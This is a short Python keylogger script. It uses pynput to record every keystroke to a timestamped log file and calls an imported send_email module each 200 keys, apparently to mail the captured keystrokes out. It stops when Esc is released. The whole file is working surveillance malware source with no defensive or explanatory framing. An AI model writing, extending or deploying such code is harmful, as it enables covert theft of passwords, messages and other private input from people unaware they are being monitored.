from pynput.keyboard import Key, Listener
import logging
import send_email

logging.basicConfig(filename="logs.txt", level=logging.DEBUG, format='%(asctime)s:%(message)s')

count = 0


def press(key):
    global count
    if count < 200:
        logging.info(str(key))
        count += 1
    else:
        send_email.email()
        count = 0


def release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()
